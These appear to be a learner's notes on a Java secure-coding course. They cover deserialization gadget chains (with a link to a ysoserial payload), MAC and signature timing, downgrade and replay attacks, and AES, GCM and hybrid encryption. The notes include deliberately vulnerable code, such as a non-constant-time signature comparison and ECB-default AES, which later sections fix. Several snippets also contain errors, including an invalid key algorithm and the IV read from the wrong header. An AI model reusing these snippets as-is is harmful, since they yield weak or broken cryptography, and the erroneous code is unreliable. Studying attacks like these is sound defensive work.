+	And if you're thinking, "my code base is huge. There's no way I can articulate all the types that are okay to be deserialized". Then, consider  the reportOnly whitelist pattern
+	Simply put, yo ucan use an implementation that has a Whitelist and instead of throwing an exception, it logs a violation
+	This is a weaker security posture than a strict whitelist, but it's better than allowing anything to be deserialized
+
+4.17 - Java Serialization is Construction
+	There is one more rule to remember when considering java deserialization
+	Since it bypasses the constructor, it's essentially another kind of constructor and should be treated like one
+	For example, if you do any type checking, defensive copies, or other additional initialization in your constructors, you need to do it as well in the readObject method
+	And just like with constructors, don't call any overridable methods
+	There are implications in the reverse too. We shouldn't perform dangerous operations like opening files or making network calls in a readObject method, so actually, this means that we also can't do that in the constructor of a Serializable object either
+	If we need to do risky things in a constructor, then we should disable serialization for that class
+
+4.18 - The Apache Commons Serialization Gadget Chain
+	I hear your mind say "but my Serializable class isn't controlled by untrusted input", but that's not really the point. The point is that an attacker can use your object as a gadget in some gadget chain of their own making
+	This happened not long ago with Apache Commons and its transformer API
+	For example, take a look at this somewhat complex looking object construction
+		https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java
+	(shows gadget chain) First, this code constructs a chain of apache commons transformers that execute a command through java runtime
+	If I call transformer chain.transform(), then my underlying runtime command will execute
+	Next, the code wraps that chain in a series of objects resulting in a HashSet
+	This clever construction makes so that if the malicious entry in the HashSet is copied to another HashSet, then the chain will execute
+	This is super clever because this is exactly what HashSet's readObject implementation does
+	Now it's not precisely important to understand how this complex code works. What's more important is that you understand that just because you trust how you are using your class, you aren't he only one who can use it
+	Just like making sure our classes are thread-safe, even if we ourselves aren't using them in a concurrent application, we need to make sure our classes are serialization safe if they inherit Serializable regardless of how our own application is using that class
+
+4.19 - Serialization and Data Stewardship
+	Nice job getting through deserialization. That is definitely the trickiest of the two from a security standpoint
+	Now let's talk very briefly about serialization
+	We sometimes think about serialization as being something for transport, but really, it's used quite often at rest as well
+	Ther are java serialized objects on file systems, in persistent messaging queues, in object databases and caches and more
+	This means that we're bound to the same rules of good data stewardship and the rule is essentially the same, regardless of our representation, and that is to somehow mark the field as transient
+	If we're using XML in java we can annotate a field with @XmlTransient and XML processors will ignore that field when serializing to XML
+	If we're using JSON, it depends on the library since there's no JSON standard library in java, but with Jackson, it's @JsonTransient and with JSON it's simply using the java transient keyword
+	And as I just hinted at, with java serialization, we can mark the field with the "transient" keyword
+	Each format comes with ways to make the field conditionally transient as well
+	In the case of java serialization, we can override classes write object method
+
+4.20 - Securing Serialization with Signatures
+	For completeness, I'd like to demo to your some less known java APIs that are useful for securing java serialization
+	The first is the ability to sign a payload with a private key and verify it with a public key
+	We'll cover signing and verifying in detail later on, but the general idea is that we want some proof that a trusted entity created this serialized payload
+	The pops up in XML and JSON as well. For example, in the SAML and OAuth 2.0 protocols, respectively
+	To sign an object, we'll use the SignedObject class. Looking at the constructor, it looks like we'll had it our object we want to sign, private key, and which algorithm we'd like to use, which java calls the signing engine
+	We've already covered how to create a private key. So now, let's create a signature. You should be used to this pattern used extensively in the JCA by now and that is to call Signature.getInstance and supply the algorithm
+		(@Test)
+		Person in = new Person(new EmployeeDetails(), Arrays.asList("some","address"));
+		KeyPair keyPair = KeyPairGenerator.getInstance("SHA").generateKeyPair();
+		Signature signature = Signature.getInstance("SHA256WITHRSA");
+		SignedObject signed = new SignedObject(in, keyPair,getPrivate(), signature);
+		byte[] ser = javaSerialize(signed);
+		signed = javaDeserialize(new ByteArrayInputStream(ser), SignedObject.class);
+		if(signed.verify(keyPair.getPublic(), signature)){
+			Person out = (Person) signed.getObject();
+			assert True
+		}else {...}
+	SHA-256 is secure at the time of this writing for reasons that I explained in earlier modules
+
+4.21 - Securing Serialization with Encrypting
+	We can also encrypt paylaods at serialization time using the SealedObject class
+	This make it so that the details of the serialized payload stay secret
+	There are circumstances when both signing and encrypting data is valuable. We sign to guarantee data integrity, and the nwe seal to keep the data secret
+	If we need both, then we do both
+	We need to do them in the right order though. We don't want to encrypt the data and then sign the encrypted data. Encryption, by nature, is entropic, meaning that the resulting encrypted bits may be different for the exact same payload
+	Because of this, the signature on encrypted bits doesn't do us much good
+	Whenever we serialize, we should sign, and then seal and then deliver
+		(@Test)
+		Person in = new Person(new EmployeeDetails(), Arrays.asList("some","address"));
+		KeyPair keyPair = KeyPairGenerator.getInstance("SHA").generateKeyPair();
+		Signature signature = Signature.getInstance("SHA256WITHRSA");
+		
+		SecretKey secretKey = KeyGenerator.getInstance("AES").generateKey();
+		Cipher cipher = Cipher.getInstance("AES");
+		cipher.init(Cipher.ENCRYPT_MODE, secretKey);
+		
+		SignedObject signed = new SignedObject(in, keyPair,getPrivate(), signature);
+		SealedObject sealed = new SealedObject(signed, cipher);
+		
+		byte[] ser = javaSerialize(sealed);
+		sealed = javaDeserialize(new ByteArrayInputStream(ser), SealedObject.class);
+		cipher.init(Cipher.DECRYPT_MODE, secretKey);
+		signed = (SignedObject) sealed.getObject(cipher);
+		if(signed.verify(keyPair.getPublic(), signature)){
+			Person out = (Person) signed.getObject();
+			assert True
+		}else {...}
+
+4.22 - Bonus Track: A Zip Slip Attack
+	The lesson here though is that deserialization is often a path for bypassing our typical validation boundaries, like constructors and HTTP filters. We need to be aware when we find ourselves in this situation of taking compressed, encoded or formatted data and materializing that into java
+
+4.23 - Review
+	And last, but not least, zip files ar enot strictly serialization, but I wanted to include it here, since this is an uncommon but related issue
+	Remember when decompressing a zip to check the location specified by each entry before actually writing to that location
+	Whether it's XML, JSON, java serialization, zip files or special character encodings, each of these can be used to bypass our traditional locations for input validation
+
+5.1 - Forging Prescriptions (Signing and Verifying Data)
+	Now that you're familiar with what attackers can do to weaponize payloads, let's take a look at the cousin issue of forging them
+	(example of forging prescriptions) But we still need the same mechanisms of authenticity, non-replayability and integrity
+
+5.2 - Forging Messages
+	(example of Terracota bank having issues)
+
+5.3 - Adding a Message Hash
+	So the first problem that we're going to solve is that the payload can be altered before it reaches its destination, meaning it lacks integrity
+	If I can successfully intercept a payload directed at Terracota bank, then I can modify it for my nefarious purposes
+	We can take this idea of parity and extend it into taking the contents of a message and signing it
+	I can, for example, use a signing algorithm called HMAC to take a message and a secret key, calculate the signature and then send that message along with a signature to a recipient
+	The recipient can use that same algorithm, key and message, calculate the signature and compare. If the signatures match, we're good. If not, the message has been tampered with, and we can reject it with confidence
+
+5.4 - Macs in Java
+	The way this is commonly achieved in cryptography is with a MAC or Message Authentication Code
+	When a MAC is included in a message, it can be used to authenticate the sender and prove the message's integrity
+	The result of copying a MAC based algorithm is called a mac but it's also sometimes called a code, a tag or a signature
+	To create a mac, the sender and receiver use a secret key that doesn't get sent in the message, but that both have in their possession
+	The simplest way java provides to achieve this is something that will feel a little familiar, and that is the Mac class
+		Mac mac = Mac.getInstance("HMACSHA256")
+		mac.init(secretKey);
+		
+		mac.update(each);
+		mac.update(individual);
+		mac.update(property);
+		
+		byte[] signature = mac.doFinal();
+	Simply put, the Mac class in java is designed like MessageDigest with getInstance, update and doFinal methods
+	The only difference is that I'll initialize Mac with a secretKey
+	Like MessageDigest, I call update() with each item that I want in the signature and then doFinal() when I'm done
+	Thereafter, as we saw in an earlier module, I'll encode the result so that it can be easily transported
+	Now if you're wondering what data should go into the signature, the answer is everything
+
+5.5 - Adding a Mac in Terracotta Bank
+	Update Terracotta bank to verify signature
+		verifySignature(HttpServletrequest request) {
+			byte[] sender = Optional.ofNullable(request.getParameter("signature");
+				.map(Base64.getDecoder()::decode)
+				.orElseThrow(notFound("signature"));
+			
+			Client c = Optional.ofNullable(request.getParameter("clientId"))
+				.map(this.clientService::findByClientId)
+				.orElseThrow(notFound("clientId"))
+			
+			Mac mac = Mac.getInstance("HMACSHA256")
+			mac.init(c.getClientSecret);
+			mac.update("v1".getBytes(UTF_8))
+			mac.update(c.getClientId().getBytes(UTF_8))
+			
+			Optional.ofNullable(request.getParameter("accountNumber"))
+				.map(num -> num.getBytes(UTF_8))
+				.ifPresent(mac::update)
+			Optional.ofNullable(request.getParameter("amount"))
+				.map(num -> num.getBytes(UTF_8))
+				.ifPresent(mac::update)
+			byte[] recipient = mac.doFinal();
+			
+			return Arrays.equals(sender, recipient)	// Something fishy here
+		}
+
+5.6 - Signatures and Timing Attacks
+	So our approach is still vulnerable to a more subtle attack
+	In my other Securing Java Web Application courses, I talk about enumeration techniques via timing attacks
+	For example, relying on the fact that an invalid SQL query returns quicker than a valid SQL query to blindly enumerate the entire database contents or relying on how fast a failed authentication comes back to guess usernames and passwords
+	Signatures can be vulnerable in the same way because they do similar comparison of secure information
+	Imagine for a minute that I can send a payload with a signature of all 0s. This will clearly fail
+	Now let's change the first couple of bytes. I have 8192 byte pairs to choose from. Hypothetically, with sufficient noise cancellation techniques, I could tell the difference in the amount of time it took for each of these 2 byte changes and select the one that took the most time to fail
+	Then I wash, rinse, and repeat until I have a valid signature
+	Now the solution is similar to what I explained in my other 2 courses, which is to have constant time verification
+	And fortunately, java ships with such a method in MessageDigest
+	If we change this call from Arrays.equals to MessageDigest.isEqual (previous section), then we're good. This is because MessageDigest.isEqual compares every byte before giving its verdict instead of short-circuiting at the first failed comparison
+
+5.7 - MessageDigest vs. Mac
+	Now you might be wondering, what's the difference between MessageDigest or hashing something in Mac or assigning something. Why not just use MessageDigest?
+	The key difference is that if the attacker knows the hashing algorithm, then he can simply create his own message and apply that algorithm, and get the same hash
+	A Mac uses a secret key, in addition to the message, so that there's some part that the attacker doesn't know
+	And even then, we shouldn't just go about using MessageDigest just with a secret key. It's not quite as simple as that
+	Certain hashing algorithms are vulnerable to length extension attacks which allow an attacker to take a valid message and add characters to it while still maining a valid signature
+	So the same rule applies, as always - DON'T DO YOUR OWN CYRPTOGRAPHY
+	A Mac addresses these length extension issues while also giving you a simple API to work with
+
+5.8 - Digital Signatures in Java
+	Of course, there's a notable trade-off that comes with using a symmetric key, like we do with a Mac
+	On the one hand, symmetric key encryption is faster. On the other hand, we don't get something called non-repudiation
+	Non-repudiation is a stronger form of authenticity, which guarantees that the message came from only one particular party
+	We can't achieve non-repudiation with a symmetric key since both the send and the receiver have a copy. Anyone that can verify a Mac obtained signature could also be the one who sent it
+	So, if we're okay with the performance hit, we can instead use an asymmetric key pair
+	Hypothetically, if I use a private key to sign a message, sending the message and signature as I did before, then the recipient can use the public key to verify the signature
+	The beauty of this is that not only is there only one party that could generate the message, the party with the private key, but also that I can safely publish my public key for anyone to verify that it was me that sent the message
+	Sender
+		Signature signature = getInstance("SHA256RSA")
+		signature.initSign(privateKey)
+		
+		signature.update(each)
+		signature.update(individual)
+		signature.update(property)
+		
+		bytep[] sender = signature.sign()
+		
+		send(bankId, accountNumber, amount, sender)
+	Receiver
+		Signature signature = getInstance("SHA256RSA")
+		signature.initVerify(publicKey)
+		
+		signature.update(each)
+		signature.update(individual)
+		signature.update(property)
+		
+		boolean verified = signature.verify(sender);
+		
+		if(verified)
+			// hooray!
+	Java offers support for digital signatures via the Signature class, which, you'll remember, we took a peek at in an earlier module, signatures, again like MessageDigest and like Mac
+	We can provide a sequence of byte arrays and when we're done, we call sign() which means to actually perform the signature operation
+
+5.9 - Adding a Digital Signature in Terracotta Bank
+	(demo of adding one more property to message - which signing algorithm to use to perform verification) 
+
+5.10 - Downgrade Attacks
+	You've probably noticed that the signature version property goes into the signature as well, just like all data
+	Does it seem weird that we'd use something inside the signature in order to verify the signature?
+	There are actually 3 things to consider here:
+		First, we're trusting something that's yet unverified, so we must check against a whitelist before proceeding. In other words, decide beforehand, in your application which signature algorithms you support, and reject any payloads indicating unexpected algorithms
+		Second, and related to this, is excluding weak algorithms. For example, the JWS specification indicates the signature algorithm in a field called "alg", and actually, one of the supported algorithms there is "none". If we were to accept any JWS signature algorithm from the client, then we'd be obligated to accept no signature, which is obviously a huge security problem
+		Third, remember that just because the payload says v1, it doesn't mean that it was actually signed that way. We could have signed it with a public key, for example
+			Imagine if an attacker signed a payload, stated a signature algorithm of v1 but actually signed it with the client's public key
+			A weak recipient would just trust the attackers claim, use the client's public key to formulate a Mac and the signatures would match
+			This tells us, once again, that we need to know beforehand what we should be expecting from that client
+			If the client is configured with a public key, we should only use algorithms that match with the associated private key
+
+5.11 - Replay Attacks
+	Now that the message can't be tampered with, we have another problem to address, and that is that even if we can't modify a message, that doesn't mean that we can't resend it
+	Consider a situation where the attacker initiates a legitimate transfer from her bank into Terracotta
+	If she can capture this payload, she can now send this message over and over as many times as she cares to, each one appearing to be legitimatly from the originating bank, since the first one was signed with the bank's private key
+	This is called a replay attack. A replay attack is when an attacker can get a vulnerable recipient to accept a message that the recipient had already processed before
+	To defend against it, we're going to need to add something more into our protocol
+	Right now the requirements are quite simple. We just need a message, a signature, and a signature version
+	Now, let's add a Guid. If we include a Globally Unique Identifier in our message and a service can remember what IDs it's already seen, then we'll have a defense against replay attacks
+	The trick, of course, is whether the recipient cna remember all those IDs. This'll work for a day, and maybe even a year from a lightweight service, but for a service that does just one transaction per second, that amounts to nearly 32 million GUIDs that it's keeping track of after just 1 year
+	Certainly, this doesn't pass test. So we can't just add a nonce to our protocol. We also need an expiry. Something that says that this message is only valid for a certain period of time
+	This has the nice benefit that we only need to hold on to nonces for the length of our expiration period. If my messages expire in 10 minutes, then I only need to hold onto nonces for 10 minutes
+	What we actually add to the message will differ based on who is the source of truth, but when it comes to simple message passing, we can easily leverage the message's created date
+	The recipient can determine it's own validity window in which it is willing to accept messages for
+	So here's what we're going to change. The message will now take a nonce, a created data, a signature, and a signature version. In addition, it will take the actual message
+
+5.12 - Adding a Nonce to Terracotta Bank
+	When a message comes in, I first verify the signature the same way that we've done before
+		private static Cache<String, String> cache = CacheBuilder.newBuilder()
+			.expireAFterWrite(Duration.ofSeconds(120)
+			.build();
+			
+		verifyMessage(HttpServletrequest request){
+			if(verifySignature(request)) {
+				String id = Optional.ofNullable(request.getParameter("id"))
+					.orElseThrow(notFound("id"))
+				
+				Instant created = Optional.ofNullable(request.getParameter("created"))
+					.map(Long::parseLong)
+					.map(Instant::ofEpochSecond)
+					.orElseThrow(notFound("created"))
+				
+				Instant now = Instant.now();
+				if(created.isAfter(now) || created.isBefore(now.minusSeconds(120))) {
+					throw IllegalArgumentException("message created outside usable window")
+				}
+				if(cache.asMap().putIfAbsent(id, id) != null){
+					throw new IllegalArgumentException("duplicate message")
+				}
+				
+				return true;
+			}
+		}
+
+5.13 - Key Rotation and JWS
+	Of course, we've been ignoring a glaring problem and that is, how do we share the keys?
+	Sharing them out-of-band is an okay solution. The sender could provide a public key as part of a registration process, and we could look up that to verify the sender's messages, but it causes a lot of heartburn when the keys need rotating
+		out-of-band - give the key in a way that is not part of the message handshake
+	And if this sounds familiar, it's because we ran into this problem earlier in the course when we were building our key service. Do you remember the answer?
+	Of course, the solution to this is to version the keys, specifying the key version in our payload
+	The sender could send a key ID, along with a message, to indicate which of the sender's key to use
+	And, since the keys are public, it's safe for the sender to serve up these keys from a known endpoint, so it doesn't have to send themn out-of-band
+		Key service endpoint - sender servers the public keys from a known endpoint
+	(diagram - Serving Public Keys)It works like this
+		Before any messages are passed at all, the receiver is configured with something to identify the sender, say a client id, and in addition, the receiver is configured with a known endpoint where the sender publishes it's public keys
+		With that configuration out of the way, we're ready to start accepting messages from that sender
+		The sender sends a signed payload that includes a key id and a client id
+		The receiver takes the client id, looks up that known endpoint and then the receiver reaches out to that endpoint to get the key
+		If any of that fails, we reject the message
+		Finally, the verification process proceeds as normal
+		The receiver can cache the key for future messages, and on a cache miss, the receiver hits the endpoint again
+	Now if you're starting to feel the weight of maintaining this code, worry no longer. In this final demonstration, we're going to depart from the conceptual implementation we've been building and replace it with a standard protocol and a library that implements that protocol
+	You may have already noticed that a number of these patterns align with the JWS specification, a protocol for signing JSON documents
+	(Table - JWS: A Protocol for Signing JSON)
+		This Module - JWS
+		signature version - alg
+		message id - jti
+		creation date - iat
+		sender id - iss
+		key id - kid
+	Among the many libraries that offer JWS support is Spring Security, so let's use that
+	Quite simply we can use the class, NimbusJwtDecoder
+		NimbusJwtDecoder jwtDecoder = NimbusJwtDecoder.withJwkSetUri("https://recipient/keys").build()
+		Jwt jwt = jwtDecoder.decode(messageBody);
+		Map<String, Object> messageData = jwt.getClaims();
+
+5.14 - Using Spring Security 5.x JWS Support
+	In Terracotta bank, first thing we'll do is include the spring-security-oauth2-jose dependency
+		org.springframework.security:spring-security-oauth2-jose:5.1.4.RELEASE
+	Even though Terracotta bank is using an old version of spring boot for the purpose of it remaining vulnerable to numerous other evil things, we can luckily still add the latest version of oauth2-jose but note that I'm not officially recommending this JAR setup
+	You should definitely also upgrade to the latest Spring Boot when you're taking a step like this
+
+6.1 - The Babington Plot (Encrypting and Decrypting Data)
+	Encryption is hard and as David Kahn once wisely said - "Few false ideas have more firmly gripped the minds of so many intelligent men than the one that, if they just tried, they could invent a cipher that no one could break"
+
+6.2 - Signing vs. Encryption
+	In the last module we saw how to make it so that, even if intercepted, the payload can't be modified
+	Now we want to make it so that if intercepted, the payloads contents can't even be interpreted
+	Just like with signing, we'll want to use a key, which means that we have a choice between symmetric and asymmetric encryption
+	Remember though, that encryption is different from signing in that it's reversible. Recall that when we're creating a Mac, the point was for the sender and the recipient to perform the same set of operations and get the same result, confirming integrity, as well as authenticity
+	However, with encryption, we need to reverse the sender's steps, similar in a way that deserialization and serialization mirror each other
+
+6.3 - Java's Cipher Class
+	Let's focus on symmetric encryption first. The way we do this in java is with the Cipher class
+		Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+		cipher.init(Cipher.ENCRYPT_MODE, key, spec);
+		byte[] encrypted = cipher.doFinal(plaintext);
+	(Reference to transformations like AES/GCM/NoPadding) Knowing exactly what string to place here is going to take some additional background information, so stay tuned
+	After specifying the transformation, we further initialize it with whether we're encrypting or decrypting and what we'll use
+	This is a little similar to how we called initSign or initVerify after getting an instance of signature
+	In the case of signature, it's two separate methods, while in the case of Cipher, it's a method with an extra parameter
+	init() can take several other parameters too, and this will depend on what algorithm we choose
+	Then once it's been initialized, we can do the same thing as beofre by calling doFinal and then encoding the result
+	And while the APIs are very similar, there's one very important difference which is the update method
+	Even though MessageDigest, Mac, Signature and Cipher all have a method called update, Cipher's update method is different, as you can see from the signature 
+		byte[] update(byte[])	// Cipher
+		void update(byte[])		// other
+	When you're calling update with Cipher, the encryption or decryption is actually being returned right then
+	This allows Cipher to not need to hold the entire plain text message in memory all at once
+	The consequence is that our former pattern of calling several updates, and then doFinal, won't work quite the same as before
+	Instead, consider using something like CipherInputStream, wrapping the stream you're reading from or if you need to call update directly, write progressively to a byte array output stream
+		InputStream is = new CipherInputStream(
+			new Base64InputStream(
+				request.getInputStream()), cipher);
+		// Or
+		baos.write(cipher.update(somedata))
+		baos.write(cipher.update(somedata))
+		baos.write(cipher.doFinal())
+
+6.4 - AES Encryption in Java
+	(Implemented Cipher in Terracotta bank)
+
+6.5 - How Secure Was That, Really?
+	Let's pause here for a quick vulnerability assessment
+	There are at least 2 problems with what we've implemented
+	The first one is essentially here where we're specifying the transformation
+		Cipher cipher = Cipher.getInstance("AES")
+	Now, it's not so much that AES is a problem as much as how we're using it
+	(demo of example in jshell) Perhaps is not surpising that AES is consistent with its result, but while consistency is important with things like mortgage payments or milk, it's not always so great with encryption
+	It's bad for the same reason that not having a salt (assault?) in a password is bad. Because AES is consistent, if I send the same message, then it will have the same encrypted result, meaning that an attacker can classify its contents if not officially decrypted
+	Like with passwords, we need to add some entropy at the beginning
+	The second problem is that I can't be certain that the version parameter hasn't been messed with
+	Remember the downgrade attacks we talkd about in the last module. To fix this, we could sign it, wrapping an encrypted payload in the signature envelope we just learned about and there are circumstances where we might do something like this. However, we don't have to
+	Instead, we can employ a strategy called authenticated encryption which ships the cipher text with an authentication tag, including certain data in the formulation of that tag
+
+6.6 - AES and Block Ciphers
+	To understand how to fix the first of these two issues, let's jump into just a little bit of cryptography
+	AES ciphers data in 128 bit blocks and we can specify the manner in which these blocks should be enciphered
+	By default, java uses the ECB block cipher which is an older generation cipher who's resulting cipher text is more predictable
+	In fact, it's pretty common to show the following 3 pictures
+		(first clear picture representing no encryption
+		second picture represents Electronic Codebook which is first generation AES that has a distorted image but you can still make out the original picture 
+		third picture represents Cipher Block Chaining where the picture is completely distorted and you can't make out anything)
+	The first is a picture in original form, the second is the pixels of that image encrypted with AES using the ECB block cipher, and the third is using the CBC block cipher
+	CBC is so much better than ECB because it uses the previous encrypted block as an input to the next block's encryption, increasing the amount of randomness in the result
+	If your java code instantiates a cipher with just the string AES, you're using a weak configuration. It's definitely time to go do some code laundry
+
+6.7 - Adding Entropy to AES
+	What we should do wehn we initialize cipher for AES is specify the block ciper to use, even if you need to use ECB and we can do that by adding a slash after AES and adding, in this case, the letters CBC
+		Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
+	What to do about that first block though, since it would also need an initial value
+	Well, we need to add what is called an initialization vector for our configuration
+	An initialization vector can be anything. For some algorithms its value is even hard-coded into its specification
+		byte[] iv = new byte[16]
+	However, in our case, it'll be a random set of bits, the same size as an AES block, generated wtih SecureRandom
+		SecureRandom rand = new SecureRandom()
+	It's important to note that this vector needs to be different for each payload that we send, that is, different each time that we encrypt something
+	The main benefit that we get from this extra work is entropy
+	Because we're starting with a random set of bits for each message, even if our message is repeated, the resulting bets will be different each time, reducing the possibility of a hacker being able to derive some kind of signal from the noise
+	Now, if you're thinking ahead, you'll wonder how the recipient is going to decrypt without knowing the initialization vector that we used and the fact is she can't
+	So we're going to have to pass that information through
+	Take a moment to think about this while we do it in an insecure way in the next demo
+	
+
+6.8 - AES CBC in Java
+	(demo of updating Terracotta bank)
+		addEncrypted(byte[] plaintext, RequestBuilder builder){
+			byte[] iv = new byte[16]
+			this.secureRandom.nextBytes(iv);
+			String ivHeader = Base64.getEncoder().encodeToString(iv);
+			builder.setHeader("X-Encryption-Iv", ivHeader); 
+			
+			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+			cipher.init(Cipher.ENCRYPT_MODE, secretKey(), new IvParameterSpec(iv))
+			byte[] ciphertext = cipher.doFinal(plaintext)
+			
+			String body = Base64.getEncoder().encodeToString(ciphertext)
+			HttpEntity entity = new BasicHttpEntity()
+			((BasicHttpEntity) entity).setContent(new ByteArrayInputStream(body.getBytes(UTF_8)))
+			builder.setEntity(entity);
+		}
+	Let's hop over to the decryption side
+		wrap(String version, HttpServletrequest request){
+			String ivHeader = request.getHeader("X-Encryption-Iv")
+			byte[] iv = Base64.getDecoder().decode(ivHeader);
+			
+			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+			cipher.init(Cipher.DECRYPT_MODE, secretKey(), new IvParameterSpec(iv))
+			
+			InputStream plain = new CipherInputStream(new Base64InputStream(request.getInputStream()), cipher)
+			return new DecryptedWrapper(request, plain)
+		}
+
+6.9 - Adding Authentication to AES
+	So it seems like a big mistake to send the initialization vector over in this way
+	Because it's unsigned, a hacker could replace it with his own initialization vector, effectively controlling at least the first block of information on decryption
+	This is the same problem as what we identified earlier with sending the algorithm over without signing it
+	As I mentioned at that time, we could sign this data. Remember Stevie Wonder though
+	Sicne the message can be signed, and then encrypted, signing encryption material thereafter would mean signing it a second time over
+	And really, if we're using CBC, then this is indeed what we should do, adding a Mac to our encryption
+	Fortunately, we can improve on this in 2 ways
+	First, CBC can't be parallelized, limiting its efficiency
+	Second though, CBC can't prove integrity on its own
+	Another mode that we can use with AES is GCM or Galois/Counter Mode
+		Cipher c = Cipher.getInstance("AES/GCM/NoPadding")
+		byte[] iv = entropy()
+		c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(iv))
+	GCM can be parallelized, so it's faster than CBC, and it also automatically includes a Mac for extra data like the algorithm, the initialization vector, and other data we might want to add, like a key identifier for key rotation
+	Using GCM is quite simple. In our transformation, we specify AES/GCM/NoPadding, and in addition to adding our data to be encrypted, we can also add associated data, or AAD, via the udpateAAD method
+		c.updateAAD(version)
+	This is similar to how update works in the Mac and signature classes that we saw in the last module
+	After we've added any associated data we want, then we add the plain text that we want to encrypt as usual
+		byte[] ciphertext = c.doFinal(plaintext)
+	When decrypting, the recipient will take the same associated data, call updateAAD, and then pss in the ciphertext the same as before
+		c.updateAAD(version)
+		byte[] plaintext = c.doFinal(ciphertext);
+	If the resulting Mac fails, then decryption fails
+
+6.10 - AES GCM in Java
+	Let's make our next change then, this time to GCM (update addEncrypted method)
+		addEncrypted(...){
+			byte[] iv = new byte[12]
+			...
+			Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding")
+			cipher.init(..., new GCMParameterSpec(128, iv))
+			cipher.updateAAD("v1".getBytes(UTF_8))
+			...
+		}
+	The GCM specification indicates that it ought to be 12 bytes for optimal performance. The Mac ought to be 16 bytes though, note that the constructor takes this value in bits
+	Then we add conversion to the associated data by adding a call to updateAAD
+	We haven't been using version in our demos but by doing this will allow the recipient to support multiple versions of it's crypto system
+	By adding it to updateAAd, GCM will include this data as part of its Mac, ensuring the integrity of that data
+	We don't add initialization vector to this Mac because GCM adds it automatically
+	The change on the decryption side is also quite straightforward
+		wrap(...){
+			...
+			Cipher cipher = ...("AES/GCM/NoPadding")
+			cipher.init(..., new GCMParameterSpec(128, iv))
+			cipher.updateAAD(version.getBytes(UTF_8))
+			...
+		}
+
+6.11 - Symmetric vs Asymmetric Encryption
+	Now let's talk about asymmetric encryption, also called public-key encryption
+	Asymmetric encryption is not quite as elegant as what we saw with digital signatures because we don't get teh same security guarantees
+	See, with signing, the sender uses his private key to generate the signature. This means that we get the cool feature of non-repudiation
+	We know how signed it because there's only one entity with that private key
+	With asymmetric encryption though, the sender will use the recipient's public key. This makes sense because we want the recipient to be the only one who can read it
+	But, since the public key is, well, public, anyone could send the recipient an encrypted message, and she'd have no idea who encrypted it
+	In other words, public key encryption doesn't provide authenticity
+	In most cases, this is okay because the sender signed the payload first, but watch out for scenarios where you need to know who performed the encryption
+	Pulic key encryption is also slower, more taxing on the CPU, and requires more iterations on the data, taxing the random number generator
+	And because of this, few practical crypto systems uses public key encryption straight up
+	What public key encryption does have going for it, though, is convenience
+	Sharing secrets with shared parties is tricky as we talked about earlier, especially when keys need rotation
+	So instead of abandoning ourselves to just symmetric encryption, we'll use something that gives us the convenience of asymmetric encryption and and the speed of symmetric encryption called hybrid encryption
+	It goes like this
+		First, a random, symmetric key is generated, a new one for every message
+		Second, the symmetric key itself is encrypted, using the recipient's public key
+		Third, the message is encrypted with that secret key, remembering to include the encrypted symmetric key as part of the associated data
+		Fourth, the message and the encrypted symmetric key are sent over the wire together
+		Upon receipt, the recipient uses his private key to decrypt the encrypted key. Then he can use the now decrypted key to decrypt the actual message
+	The value of this hybrid approach is that it minimizes the amount of time spend doing asymmetric encryption, focusing on just the key for that
+	The data itself is encrypted with symmetric encryption, which is much faster
+
+6.12 - Hybrid Encryption with JCA
+	To implement hybrid encryption, we're going to need two keys and two ciphers
+	(demo of updating addEncrypted)
+		addEncrypted(...){
+			Cipher keyCipher = Cipher.getInstance("RSA");
+			keyCipher.init(Cipher.ENCRYPT_MODE, publicKey());
+			
+			...
+			builder.setHeader("X-Encryption-Iv", ivHeader);
+			
+			SecretKey secretKey = KeyGenerator.getInstance("AES").generateKey()
+			byte[] encryptedKey = keyCipher.doFinal(secretKey.getEncoded())
+			String encryptedKeyHeader = Base64.getEncoder().encodeToString(encryptedKey)
+			builder.setHeader("X-Encryption-Key", encryptedKeyHeader)
+			
+			Cipher bodyCipher = ... ("AES/GCM/NoPadding");	// rename cipher to bodyCipher
+			...
+			bodyCipher.updateAAD("v1".getBytes(UTF_8))
+			bodyCipher.updateAAD(encryptedKey)
+			...
+		}
+	on the decryption side, we do the steps in reverse
+		wrap(...){
+			Cipher keyCipher = Cipher.getInstance("RSA")
+			keyCipher.init(Cipher.DECRYPT_MODE, privateKey())
+			String encryptedKeyHeader = request.getHeader("X-Encryption-Key")
+			byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyHeader)
+			byte[] secretKey = keyCipher.doFinal(encryptedKey)
+			SecretKey key = new SecretKey(secretKey, "AES")
+			
+			String ivHeader = request.getHeader("X-Encryption-Key")
+			byte[] iv ...
+			...
+			cipher.updateAAD(version.getBytes(UTF_8))
+			cipher.updateAAD(encryptedKey)
+			...
+		}
+
+6.13 - Intro to Google Tink
+	Over the last several modules, we've seen some friction with JCA, specifically around how easy or not it is to make the right decision
+	Let's review just a couple of them here
+		The first is very fresh in our memory and that is specifying the entirely reasonable AES value to initialize a cipher is actually a weak choice, since that will choose ECB by default
+		Because everyting gets embeeded into a string, it's difficult ot get compile time warnings, and even at runtime, things may appear to be working just fine
+		The second is similar. When generating keys, java will create a key according to provider defaults for that algorithm. For example, when generating an AES key, so then JCE defaults to 128 bit key
+		These days, 256 bits is often recommended, so we have to remember to call the init method when generating a key
+		And actually, there's a third, which is that more complex scenarios, like hybrid encryption, have a lot of boilerplate, like we just saw
+	Each of these screams for some kind of library to simplify all of this
+	Enter Google Tink. Google Tink is a  library that works at a higher level than the JCA and it addresses these issues of making the right cryptography decision
+	Let's take our scenario of hybrid encryption as an example
+	Google Tink is based on a few simple concepts. This first is the notion of a primitive
+	Simply put, a primitive is the kind of cryptographic operation you're working with. Mac is a Tink primitive, digital  signatures is another, authenticated encryption is yet another
+	Hybrid encryption is the Tink primitive that we're going to look at in this section
+		HybridConfig.register();	// initialize the Hybrid primitive
+	Each primitive has a number of supported implementations. For example, Tink implements ECIES with AAD and HKDF for hybrid encryption
+		KeyTemplate implementation = // use this Hybrid algorithm
+		HybridTemplates.ECIES_P256_HKDF_HMAC_SHA256_AES128_GCM;
+	and may later implement NaCl (salt?) crypto box
+	In addition to primitives and thier implementations, Tink also has what are called KeysetHandles
+	The name may sound a bit of a mouthful, but it breaks down like this
